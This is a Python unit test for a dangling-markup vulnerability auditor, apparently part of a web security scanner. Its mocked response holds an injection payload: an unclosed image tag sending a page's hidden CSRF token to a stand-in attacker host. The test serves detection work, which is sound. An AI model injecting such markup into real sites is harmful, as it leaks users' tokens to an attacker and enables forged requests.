"""Unit tests for DanglingMarkupAuditor."""
import unittest
from unittest.mock import MagicMock, patch
import httpx

from backend_api.models.endpoint import Endpoint
from backend_api.models.param import Param
from backend_api.services.auditors.dangling_markup import DanglingMarkupAuditor


class TestDanglingMarkupAuditor(unittest.TestCase):

    @patch("httpx.Client.request")
    def test_dangling_markup_detected(self, mock_request):
        """Unescaped dangling image tag followed by CSRF token is detected."""
        mock_resp = MagicMock(spec=httpx.Response)
        mock_resp.status_code = 200
        mock_resp.text = (
            "<html><body><div class='user'>Hello <img src='https://xssboss.invalid/leak?data= "
            "<input type='hidden' name='csrf_token' value='SECRET_TOKEN_123'></div></body></html>"
        )
        mock_request.return_value = mock_resp

        ep = Endpoint(id=1, url_pattern="https://example.com/profile", method="GET")
        param = Param(id=1, endpoint_id=1, name="name", location="query")
        ep.params = [param]

        db = MagicMock()
        findings = DanglingMarkupAuditor.audit_endpoints(db, [ep])

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].vuln_type, "dangling_markup_img")


if __name__ == "__main__":
    unittest.main()
